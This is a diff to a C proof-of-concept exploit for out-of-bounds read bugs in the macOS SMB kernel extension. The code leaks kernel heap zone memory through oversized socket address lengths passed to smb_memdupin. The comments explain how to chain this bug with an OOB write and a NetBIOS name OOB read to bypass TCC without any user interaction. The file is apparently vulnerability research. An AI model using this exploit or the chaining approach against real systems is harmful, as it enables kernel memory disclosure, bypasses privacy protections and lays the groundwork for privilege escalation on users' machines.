@@ -75,7 +75,7 @@
 ///     // Initial state validations
 ///     ...
 ///     // Copy in `saddr` from user memory.  ***NOTE***: copied in saddr may have value of
-///     // `sa_len` greater than ioc_saddr_len
+///     // `sa_len` field greater than ioc_saddr_len
 ///     saddr = smb_memdupin(session_spec->ioc_kern_saddr, session_spec->ioc_saddr_len);
 ///     if (saddr == NULL) {
 ///         return ENOMEM;
@@ -102,7 +102,7 @@
 ///         /* NetBIOS connections require a local address */
 ///         if (saddr->sa_family == AF_NETBIOS) {
 ///             // Copy in `laddr` from user memory. ***NOTE***: copied in laddr may have `sa_len`
-///             // value greater than ioc_laddr_len
+///             // value greater than `ioc_laddr_len`
 ///             laddr = smb_memdupin(session_spec->ioc_kern_laddr, session_spec->ioc_laddr_len);
 ///             if (laddr == NULL) {
 ///                 SMB_FREE(saddr, M_SMBDATA);
@@ -209,13 +209,14 @@
 ///    ...
 /// }
 ///
-/// NOTE: The method used in the POC below for reading `sessionp->session_saddr` to
+/// NOTE: The method used in this POC for reading `sessionp->session_saddr` to
 /// user land requires opening a file inside SMB share to execute the `fcntl` request. This
 /// will require user interaction because files in network shares are protected by TCC.
 ///
-/// This resctriction is bypassed in `xpl_kmem/memory/zkext_neighbor_reader.c` by using
-/// NetBIOS name OOB read vulnerability in default.64 zone to read zone elements from zones
-/// with element size less than 128 bytes without any user interaction.
+/// This restriction is bypassed in `xpl_kmem/memory/oob_reader_ovf.c` by combining this
+/// vulnerability with OOB write vulnerability discussed in `poc_oob_write` and NetBIOS name
+/// OOB read vulnerability discussed in `poc_snb_name_oob_read` to read succeeding zone
+/// elements from zones with element size less than 128 bytes without any user interaction.
 ///
 
 
@@ -263,8 +264,9 @@ void oob_read_kext_32(const struct sockaddr_in* smb_addr) {
         exit(1);
     }
     
-    /// Zone from which OOB read is to be done. This will the zone to which socket address
-    /// will be copied from user memory to kernel memory using `smb_memdupin` method
+    /// Zone from which OOB read is to be done. This will the zone in `KHEAP_KEXT` to which
+    /// socket address will be copied from user memory to kernel memory using
+    /// `smb_memdupin` method
     const int src_zone_size = 32;
     /// Amount of OOB data to be read from successor element in src_zone
     const int oob_read_size = 32;
@@ -284,7 +286,7 @@ void oob_read_kext_32(const struct sockaddr_in* smb_addr) {
     if (saddr.snb_len > 64) {
         /// If the server socket address size is greater than 64 bytes, it will trigger the OOB write bug
         /// in `smb_dup_sockaddr` method which may lead to kernel panic (See poc_oob_write)
-        printf("[WARN] server socket address size greater than 64 bytes\n");
+        printf("[WARN] server socket address size greater than 64 bytes. may trigger kernel panic due to OOB write in default.64 zone\n");
     }
     
     struct sockaddr_nb laddr;
@@ -388,8 +390,8 @@ int main(int argc, const char * argv[]) {
     bzero(&smb_addr, sizeof(smb_addr));
     smb_addr.sin_family = AF_INET;
     smb_addr.sin_len = sizeof(smb_addr);
-    smb_addr.sin_port = htons(xpl_SMBX_PORT);
-    inet_aton(xpl_SMBX_HOST, &smb_addr.sin_addr);
+    smb_addr.sin_port = htons(XPL_SMBX_PORT);
+    inet_aton(XPL_SMBX_HOST, &smb_addr.sin_addr);
     
     int num_oob_read_attempts = 10;
     for (int i=0; i<num_oob_read_attempts; i++) {
